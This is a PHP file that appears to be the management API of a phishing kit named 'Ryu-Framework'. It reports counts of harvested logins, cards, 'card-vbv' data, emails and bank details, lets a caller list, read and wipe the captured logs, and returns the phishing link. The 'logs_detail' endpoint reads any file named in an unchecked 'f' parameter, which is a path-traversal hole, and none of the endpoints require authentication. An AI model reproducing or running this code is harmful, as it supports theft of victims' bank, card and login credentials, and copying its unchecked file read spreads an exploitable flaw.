<?php
@header('Content-Type: application/json');

require '../app/config/config.php';
require '../core/functions/number.php';



function build_response($data)
{
	return json_encode($data,JSON_PRETTY_PRINT);
}
function get_method($method,$callback)
{
	if($_GET['method'] == $method)
	{
		return $callback();
	}
}

if(empty($_GET['method']))
{

	echo "Ryu-Framework api client ";
	exit;
}else{

	get_method('stats' ,function()
	{
		  $count_visitor = count_stats('visitor');
		  $count_bot = count_stats('block');
		  $count_login = count_stats('login');
		  $count_card = count_stats('card');
		  $count_vbv =count_stats('card-vbv');
		  $count_pap = count_stats('pap');
		  $count_email = count_stats('email');
		  $count_bank = count_stats('bank');

		  $data = ['visitor' => $count_visitor , 
		  			'bot' => $count_bot,
		  			'login' => $count_login,
		  			'card' => $count_card,
		  			'vbv' => $count_vbv,
		  			'pap' => $count_pap,
		  			'email' => $count_email,
		  			'bank' => $count_bank];
		  exit(build_response($data));

	});

	get_method('logs' , function()
	{
		$scan_log = scandir(__DIR__ . '/logs/');
		$data = [];
		foreach($scan_log as $log)
		{
			if(!preg_match("/log/",$log))continue;
			$data[] = $log;
		}

		exit(build_response($data));
	});

	get_method('logs_detail' , function()
	{
		$base = __DIR__.'/logs/';
		$name = $_GET['f'];

		if(empty($name)){
			exit('invalid filename , required parameter <b>f</b>');
		}else{

			exit(file_get_contents($base.$name));
		}
	});

	get_method('reset' , function()
	{
		$scan_log = scandir(__DIR__ . '/logs/');
		$data = [];
		foreach($scan_log as $log)
		{
			if(!preg_match("/log/",$log))continue;
			@unlink(__DIR__.'/logs/'.$log);
		}

		exit('success');

	});

	get_method('visit' , function()
	{
		$cof = json_decode(file_get_contents('../app/config/config.json'),true);
		exit(build_response(['link' => 'https://'.$cof['domain'].'/?'.$cof['parameter']]));
	});
}